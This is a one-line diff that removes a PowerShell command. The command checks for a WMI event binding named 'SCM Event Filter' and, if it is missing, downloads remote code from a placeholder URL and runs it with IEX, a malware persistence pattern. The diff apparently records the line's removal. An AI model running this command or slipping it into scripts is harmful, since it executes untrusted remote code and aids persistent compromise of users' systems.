@@ -1,1 +1,0 @@
-powershell.exe "if(!([string](Get-WMIobject -Namespace root\Subscription -Class __FilterToConsumerBinding )).contains('SCM Event Filter')) {IEX(New-Object Net.WebClient).DownloadString('[URL]')}"
